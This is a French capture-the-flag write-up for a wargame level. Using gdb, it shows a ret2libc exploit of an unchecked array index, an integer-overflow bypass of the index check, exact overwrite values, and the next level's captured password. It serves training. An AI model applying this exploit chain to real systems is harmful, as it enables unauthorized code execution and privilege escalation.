# Level 07

## Introduction

Le programme permet un overflow via le premier argument de main (tableau char de 100 lignes). Sachant qu'on ne peut saisir qu'un unsigned int, on va essayer de trouver une addresse à la suite du tableau. En investiguant, on trouve que l'adresse de sortie de main (registre eip sauvegardé dans la scope main), est stocké dans une variable accessible via le buffer overflow. A partir de ça, on va faire la technique *ret-to-libc*, pour faire un appel à `system("/bin/sh")`.

## Resumé

 1. Décompiler le programme : https://dogbolt.org/?id=8664e046-211f-4772-a084-6112ec01480f ;
 2. Trouver l'addresse du tableau ;
 3. Trouver sur quoi on va écrire (ici l'adresse de retour de main) ;
 4. Calculer l'ecart pour connaitre l'offset (et bypasser le modulo de 3) ;
 5. Récupérer l'adresse de `system`, `exit`, et `/bin/sh` ;
 6. Exploiter.

## Etapes

(Voir [source.c](../source.c) pour le code complet)

Pour exploiter `data_array[index] = number;` ():
 1. Il faut commencer par connaitre l'index de `data_array` ;
 2. Il faut trouver l'index qui permet de réécrire une zone qu'on souhaite

### Trouver l'adresse de data_array

L'adresse correspond à l'`eax` lors du `breakpoint read_number` soit : `0xffffd134`.

(On peut valider cet info via `find`).

```sh
(gdb) b read_number                                            
Breakpoint 1 at 0x80486dd                                      
(gdb) run                                                      
#...                                                               
Input command: store                                           
 Number: 42                                                    
 Index: 1                                                      
 Completed store command successfully                          
Input command: read                                            
                                                               
Breakpoint 1, 0x080486dd in read_number ()                      
(gdb) find $esp, $esp+0x200, 42                                
0xffffd138                                                     
1 pattern found.                                               
(gdb) i r                                                      
eax            0xffffd134       -11980                         
ecx            0xffffd200       -11776                         
edx            0xffffd200       -11776                         
ebx            0xffffd134       -11980                         
esp            0xffffd0e0       0xffffd0e0                     
ebp            0xffffd108       0xffffd108                     
esi            0xffffd2cc       -11572                         
edi            0x8048d65        134516069                      
eip            0x80486dd        0x80486dd <read_number+6>      
eflags         0x282    [ SF IF ]                              
cs             0x23     35                                     
ss             0x2b     43                                     
ds             0x2b     43                                     
es             0x2b     43                                     
fs             0x0      0                                      
gs             0x63     99                                     
```

### Trouver le bon index permettant d'injecter un shellcode ou appel à system

Sachant que `index` est un unsigned int, il faut une adresse après `0xffffd134` et non avant.

```
(gdb) b main
Breakpoint 1 at 0x8048729
(gdb) run
Starting program: /home/users/level07/level07

Breakpoint 1, 0x08048729 in main ()
(gdb) i f
Stack level 0, frame at 0xffffd300:
 eip = 0x8048729 in main; saved eip 0xf7e45513
 Arglist at 0xffffd2f8, args:
 Locals at 0xffffd2f8, Previous frame's sp is 0xffffd300
 Saved registers:
  ebp at 0xffffd2f8, eip at 0xffffd2fc
```

Le pointeur de sortie de la fonction main, est l'eip sauvegardé soit `0xffffd2fc`.

```
(gdb) p 0xffffd2fc-0xffffd134
$1 = 456
(gdb) p $1 / 4
$2 = 114
```

En vérifiant, l'`index` est bien positif et il nous faut la valeur 114 pour écrire sur l'`index`.

### Bypasser la protection sur l'index

Bypasser la protection sur 114 (en utilisant MAX_INT) :

```
(gdb) p (1<<31-1)
$0 = 1073741824
p (int)(unsigned int *)((1073741824 + 114) * 4)
$1 = 456
(gdb) p 1073741824 + 114
$2 = 1073741938
```

### Executer system("/bin/sh")

Pour `system` et `exit` :

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
# 4159090384
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
# 4159040368
```

Pour `/bin/sh` :

[Documentation ici](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc#finding-bin-sh)

```
(gdb) info proc map
process 1906
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
         0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
         0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
        0xf7e2b000 0xf7e2c000     0x1000        0x0
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0
        0xf7fda000 0xf7fdb000     0x1000        0x0
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
level07@OverRide:~$ strings -a -t x /lib32/libc-2.15.so | grep "/bin/sh"
 15d7ec /bin/sh

#0xf7e2c000 + 15d7ec = 0xF7F897EC -> 4160264172
```

[Documentation sur l'ordre system, exit, argument](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc#diagram)

On obtient donc :

1) **system** Index: `1073741938` - Value: `4159090384`
2) **exit** Index: `115` - Value: `4159040368`
3) **/bin/sh** Index: `116` - Value: `4160264172`

Ce qui fait :

```
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

On a donc le flag :

```
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```